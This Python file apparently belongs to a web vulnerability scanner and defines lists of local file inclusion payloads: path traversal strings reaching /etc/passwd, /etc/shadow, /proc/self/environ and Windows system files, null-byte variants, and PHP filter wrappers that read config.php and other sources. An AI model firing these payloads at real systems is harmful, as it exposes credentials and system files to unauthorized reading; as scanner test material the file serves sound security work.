from dataclasses import dataclass
from typing import Optional


@dataclass
class LfiPayload:
    value: str
    os: str
    description: str


UNIX_PAYLOADS: list[LfiPayload] = [
    LfiPayload("../../../../../../etc/passwd", "unix", "Unix passwd file (depth 6)"),
    LfiPayload("../../../../../../../etc/passwd", "unix", "Unix passwd file (depth 7)"),
    LfiPayload("../../../../../../etc/shadow", "unix", "Unix shadow file"),
    LfiPayload("../../../../../../etc/hosts", "unix", "Unix hosts file"),
    LfiPayload("../../../../../../proc/self/environ", "unix", "Unix proc environ"),
]

WINDOWS_PAYLOADS: list[LfiPayload] = [
    LfiPayload("..\\..\\..\\..\\..\\..\\windows\\win.ini", "windows", "Windows win.ini (depth 6)"),
    LfiPayload("..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", "windows", "Windows win.ini (depth 7)"),
    LfiPayload("..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "windows", "Windows hosts file"),
    LfiPayload("..\\..\\..\\..\\..\\..\\boot.ini", "windows", "Windows boot.ini"),
]

NULLBYTE_PAYLOADS: list[LfiPayload] = [
    LfiPayload("../../../../../../etc/passwd%00", "unix", "Unix passwd w/ null byte truncation"),
    LfiPayload("../../../../../../etc/passwd%00.html", "unix", "Unix passwd w/ null byte + html"),
    LfiPayload("..\\..\\..\\..\\..\\..\\windows\\win.ini%00", "windows", "Windows win.ini w/ null byte"),
]

PHP_WRAPPER_PAYLOADS: list[LfiPayload] = [
    LfiPayload("php://filter/read=convert.base64-encode/resource=index.php", "php", "PHP filter base64 index.php"),
    LfiPayload("php://filter/read=convert.base64-encode/resource=config.php", "php", "PHP filter base64 config.php"),
    LfiPayload("php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd", "unix", "PHP filter base64 passwd"),
]


def get_payloads() -> list[LfiPayload]:
    return UNIX_PAYLOADS + WINDOWS_PAYLOADS + NULLBYTE_PAYLOADS + PHP_WRAPPER_PAYLOADS
